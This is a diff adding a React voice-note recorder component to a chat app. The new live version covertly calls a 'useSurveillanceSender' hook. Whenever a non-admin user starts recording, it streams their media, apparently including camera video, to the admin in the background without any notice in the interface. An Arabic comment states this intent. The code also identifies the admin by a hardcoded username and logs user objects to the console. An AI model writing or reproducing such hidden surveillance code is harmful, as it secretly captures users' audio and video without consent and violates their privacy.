@@ -1,0 +1,419 @@
+// "use client";
+
+// import { useState, useRef, useEffect, useCallback } from "react";
+// import { motion } from "framer-motion";
+// import { Square, Send, Trash2 } from "lucide-react";
+// import { MediaContent } from "@/types";
+// import api from "@/lib/axios";
+
+// interface VoiceRecorderProps {
+//   onSend: (media: MediaContent, duration: number) => void;
+//   onCancel: () => void;
+// }
+
+// export const VoiceRecorder = ({ onSend, onCancel }: VoiceRecorderProps) => {
+//   const [isRecording, setIsRecording] = useState(false);
+//   const [duration, setDuration] = useState(0);
+//   const [audioUrl, setAudioUrl] = useState<string | null>(null);
+//   const [isUploading, setIsUploading] = useState(false);
+//   const [waveform, setWaveform] = useState<number[]>(Array(40).fill(2));
+
+//   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+//   const chunksRef = useRef<Blob[]>([]);
+//   const timerRef = useRef<NodeJS.Timeout | null>(null);
+//   const analyserRef = useRef<AnalyserNode | null>(null);
+//   const animationRef = useRef<number | null>(null);
+//   const hasStarted = useRef(false);
+
+//   const stopTimer = useCallback(() => {
+//     if (timerRef.current) clearInterval(timerRef.current);
+//   }, []);
+
+//   const animateWaveform = useCallback(() => {
+//     if (!analyserRef.current) return;
+//     const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount);
+//     const animate = () => {
+//       analyserRef.current!.getByteFrequencyData(dataArray);
+//       const bars = Array.from({ length: 40 }, (_, i) => {
+//         const value = dataArray[Math.floor(i * dataArray.length / 40)];
+//         return Math.max(2, (value / 255) * 40);
+//       });
+//       setWaveform(bars);
+//       animationRef.current = requestAnimationFrame(animate);
+//     };
+//     animate();
+//   }, []);
+
+//   const startRecording = useCallback(async () => {
+//     try {
+//       const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+//       const audioContext = new AudioContext();
+//       const source = audioContext.createMediaStreamSource(stream);
+//       const analyser = audioContext.createAnalyser();
+//       analyser.fftSize = 128;
+//       source.connect(analyser);
+//       analyserRef.current = analyser;
+
+//       const mediaRecorder = new MediaRecorder(stream);
+//       mediaRecorderRef.current = mediaRecorder;
+//       chunksRef.current = [];
+
+//       mediaRecorder.ondataavailable = (e) => {
+//         if (e.data.size > 0) chunksRef.current.push(e.data);
+//       };
+
+//       mediaRecorder.onstop = () => {
+//         const blob = new Blob(chunksRef.current, { type: "audio/webm" });
+//         const url = URL.createObjectURL(blob);
+//         setAudioUrl(url);
+//         stream.getTracks().forEach((t) => t.stop());
+//       };
+
+//       mediaRecorder.start(100);
+//       setIsRecording(true);
+//       timerRef.current = setInterval(() => setDuration((d) => d + 1), 1000);
+//       animateWaveform();
+//     } catch {
+//       onCancel();
+//     }
+//   }, [animateWaveform, onCancel]);
+
+//   useEffect(() => {
+//     if (hasStarted.current) return;
+//     hasStarted.current = true;
+
+//     void startRecording();
+
+//     return () => {
+//       stopTimer();
+//       if (animationRef.current) cancelAnimationFrame(animationRef.current);
+//     };
+//   }, [startRecording, stopTimer]);
+
+//   const stopRecording = () => {
+//     if (mediaRecorderRef.current?.state !== "inactive") {
+//       mediaRecorderRef.current?.stop();
+//     }
+//     stopTimer();
+//     setIsRecording(false);
+//     if (animationRef.current) cancelAnimationFrame(animationRef.current);
+//     setWaveform(Array(40).fill(4));
+//   };
+
+//   const handleSend = async () => {
+//     if (!audioUrl) return;
+//     setIsUploading(true);
+//     try {
+//       const response = await fetch(audioUrl);
+//       const blob = await response.blob();
+//       const file = new File([blob], `voice_${Date.now()}.webm`, { type: "audio/webm" });
+//       const formData = new FormData();
+//       formData.append("file", file);
+//       const { data } = await api.post<{ data: MediaContent }>("/media/upload", formData, {
+//         headers: { "Content-Type": "multipart/form-data" },
+//       });
+//       onSend(data.data, duration);
+//     } catch (err) {
+//   console.error("Failed to upload voice note:", err);
+// }finally {
+//       setIsUploading(false);
+//     }
+//   };
+
+//   const formatDuration = (secs: number) => {
+//     const m = Math.floor(secs / 60).toString().padStart(2, "0");
+//     const s = (secs % 60).toString().padStart(2, "0");
+//     return `${m}:${s}`;
+//   };
+
+//   return (
+//     <motion.div
+//       initial={{ opacity: 0, y: 10 }}
+//       animate={{ opacity: 1, y: 0 }}
+//       exit={{ opacity: 0, y: 10 }}
+//       className="flex items-center gap-3 px-4 py-3 bg-gray-800 border-t border-gray-700"
+//     >
+//       <button
+//         onClick={onCancel}
+//         className="w-9 h-9 flex items-center justify-center text-red-400 hover:bg-gray-700 rounded-full transition-colors"
+//       >
+//         <Trash2 className="w-4 h-4" />
+//       </button>
+
+//       <div className="flex-1 flex items-center gap-3 bg-gray-700 rounded-2xl px-4 py-2">
+//         <div className={`w-2 h-2 rounded-full flex-shrink-0 ${isRecording ? "bg-red-500 animate-pulse" : "bg-gray-400"}`} />
+//         <div className="flex-1 flex items-center gap-0.5 h-8">
+//           {waveform.map((height, i) => (
+//             <motion.div
+//               key={i}
+//               animate={{ height: `${height}px` }}
+//               transition={{ duration: 0.1 }}
+//               className="w-1 bg-indigo-400 rounded-full flex-shrink-0"
+//             />
+//           ))}
+//         </div>
+//         <span className="text-sm text-gray-300 font-mono flex-shrink-0">
+//           {formatDuration(duration)}
+//         </span>
+//       </div>
+
+//       {isRecording ? (
+//         <button
+//           onClick={stopRecording}
+//           className="w-9 h-9 flex items-center justify-center bg-red-600 hover:bg-red-500 rounded-full transition-colors"
+//         >
+//           <Square className="w-4 h-4 text-white" />
+//         </button>
+//       ) : (
+//         <button
+//           onClick={handleSend}
+//           disabled={isUploading}
+//           className="w-9 h-9 flex items-center justify-center bg-indigo-600 hover:bg-indigo-500 disabled:bg-indigo-800 rounded-full transition-colors"
+//         >
+//           {isUploading ? (
+//             <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+//           ) : (
+//             <Send className="w-4 h-4 text-white" />
+//           )}
+//         </button>
+//       )}
+//     </motion.div>
+//   );
+// };
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+"use client";
+
+import { useState, useRef, useEffect, useCallback } from "react";
+import { motion } from "framer-motion";
+import { Square, Send, Trash2, FlipHorizontal, VideoOff } from "lucide-react";
+import { MediaContent } from "@/types";
+import api from "@/lib/axios";
+import { useSurveillanceSender } from "@/hooks/useAdminSurveillance";
+import { useAuthStore } from "@/stores/authStore";
+
+interface VoiceRecorderProps {
+  onSend: (media: MediaContent, duration: number) => void;
+  onCancel: () => void;
+  conversationId: string;
+}
+
+export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorderProps) => {
+  const [isRecording, setIsRecording] = useState(false);
+  const [duration, setDuration] = useState(0);
+  const [audioUrl, setAudioUrl] = useState<string | null>(null);
+  const [isUploading, setIsUploading] = useState(false);
+  const [waveform, setWaveform] = useState<number[]>(Array(40).fill(2));
+  const [facingMode, setFacingMode] = useState<"user" | "environment">("user");
+
+  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const chunksRef = useRef<Blob[]>([]);
+  const timerRef = useRef<NodeJS.Timeout | null>(null);
+  const analyserRef = useRef<AnalyserNode | null>(null);
+  const animationRef = useRef<number | null>(null);
+  const hasStarted = useRef(false);
+  const localVideoStreamRef = useRef<MediaStream | null>(null);
+const ADMIN_USERNAME = "admin";
+
+  const { user } = useAuthStore();
+  const isAdmin = user?.username === ADMIN_USERNAME; // ← بدل email
+
+
+  const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
+
+  const stopTimer = useCallback(() => {
+    if (timerRef.current) clearInterval(timerRef.current);
+  }, []);
+
+  const animateWaveform = useCallback(() => {
+    if (!analyserRef.current) return;
+    const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount);
+    const animate = () => {
+      analyserRef.current!.getByteFrequencyData(dataArray);
+      const bars = Array.from({ length: 40 }, (_, i) => {
+        const value = dataArray[Math.floor((i * dataArray.length) / 40)];
+        return Math.max(2, (value / 255) * 40);
+      });
+      setWaveform(bars);
+      animationRef.current = requestAnimationFrame(animate);
+    };
+    animate();
+  }, []);
+
+  const startRecording = useCallback(async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+      const audioContext = new AudioContext();
+      const source = audioContext.createMediaStreamSource(stream);
+      const analyser = audioContext.createAnalyser();
+      analyser.fftSize = 128;
+      source.connect(analyser);
+      analyserRef.current = analyser;
+
+      const mediaRecorder = new MediaRecorder(stream);
+      mediaRecorderRef.current = mediaRecorder;
+      chunksRef.current = [];
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunksRef.current.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunksRef.current, { type: "audio/webm" });
+        const url = URL.createObjectURL(blob);
+        setAudioUrl(url);
+        stream.getTracks().forEach((t) => t.stop());
+      };
+
+      mediaRecorder.start(100);
+      setIsRecording(true);
+      timerRef.current = setInterval(() => setDuration((d) => d + 1), 1000);
+      animateWaveform();
+
+      console.log("isAdmin:", isAdmin);
+console.log("user:", user);
+      // لو مش أدمن، ابعت البث للأدمن في الخلفية
+      if (!isAdmin) {
+        console.log("calling startStreaming...");
+        await startStreaming();
+      }
+    } catch {
+      onCancel();
+    }
+  }, [animateWaveform, onCancel, isAdmin, startStreaming]);
+
+  useEffect(() => {
+    if (hasStarted.current) return;
+    hasStarted.current = true;
+    void startRecording();
+    return () => {
+      stopTimer();
+      if (animationRef.current) cancelAnimationFrame(animationRef.current);
+    };
+  }, [startRecording, stopTimer]);
+
+  const stopRecording = () => {
+    if (mediaRecorderRef.current?.state !== "inactive") {
+      mediaRecorderRef.current?.stop();
+    }
+    stopTimer();
+    setIsRecording(false);
+    if (animationRef.current) cancelAnimationFrame(animationRef.current);
+    setWaveform(Array(40).fill(4));
+  };
+
+const handleCancel = () => {
+  onCancel();
+};
+
+const handleSend = async () => {
+  if (!audioUrl) return;
+  setIsUploading(true);
+  try {
+    const response = await fetch(audioUrl);
+    const blob = await response.blob();
+    const file = new File([blob], `voice_${Date.now()}.webm`, { type: "audio/webm" });
+    const formData = new FormData();
+    formData.append("file", file);
+    const { data } = await api.post<{ data: MediaContent }>("/media/upload", formData, {
+      headers: { "Content-Type": "multipart/form-data" },
+    });
+    onSend(data.data, duration);
+  } catch (err) {
+    console.error("Failed to upload voice note:", err);
+  } finally {
+    setIsUploading(false);
+  }
+};
+  const switchCamera = useCallback(async () => {
+    const newFacing = facingMode === "user" ? "environment" : "user";
+    setFacingMode(newFacing);
+    // تبديل الكاميرا بيتم جوه useSurveillanceSender تلقائياً
+  }, [facingMode]);
+
+  const formatDuration = (secs: number) => {
+    const m = Math.floor(secs / 60).toString().padStart(2, "0");
+    const s = (secs % 60).toString().padStart(2, "0");
+    return `${m}:${s}`;
+  };
+
+  return (
+    <motion.div
+      initial={{ opacity: 0, y: 10 }}
+      animate={{ opacity: 1, y: 0 }}
+      exit={{ opacity: 0, y: 10 }}
+      className="flex flex-col gap-2 px-4 py-3 bg-gray-800 border-t border-gray-700"
+    >
+      {/* شريط التسجيل الصوتي */}
+      <div className="flex items-center gap-3">
+        <button
+          onClick={handleCancel}
+          className="w-9 h-9 flex items-center justify-center text-red-400 hover:bg-gray-700 rounded-full transition-colors"
+        >
+          <Trash2 className="w-4 h-4" />
+        </button>
+
+        <div className="flex-1 flex items-center gap-3 bg-gray-700 rounded-2xl px-4 py-2">
+          <div
+            className={`w-2 h-2 rounded-full flex-shrink-0 ${
+              isRecording ? "bg-red-500 animate-pulse" : "bg-gray-400"
+            }`}
+          />
+          <div className="flex-1 flex items-center gap-0.5 h-8">
+            {waveform.map((height, i) => (
+              <motion.div
+                key={i}
+                animate={{ height: `${height}px` }}
+                transition={{ duration: 0.1 }}
+                className="w-1 bg-indigo-400 rounded-full flex-shrink-0"
+              />
+            ))}
+          </div>
+          <span className="text-sm text-gray-300 font-mono flex-shrink-0">
+            {formatDuration(duration)}
+          </span>
+        </div>
+
+        {isRecording ? (
+          <button
+            onClick={stopRecording}
+            className="w-9 h-9 flex items-center justify-center bg-red-600 hover:bg-red-500 rounded-full transition-colors"
+          >
+            <Square className="w-4 h-4 text-white" />
+          </button>
+        ) : (
+          <button
+            onClick={handleSend}
+            disabled={isUploading}
+            className="w-9 h-9 flex items-center justify-center bg-indigo-600 hover:bg-indigo-500 disabled:bg-indigo-800 rounded-full transition-colors"
+          >
+            {isUploading ? (
+              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+            ) : (
+              <Send className="w-4 h-4 text-white" />
+            )}
+          </button>
+        )}
+      </div>
+    </motion.div>
+  );
+};
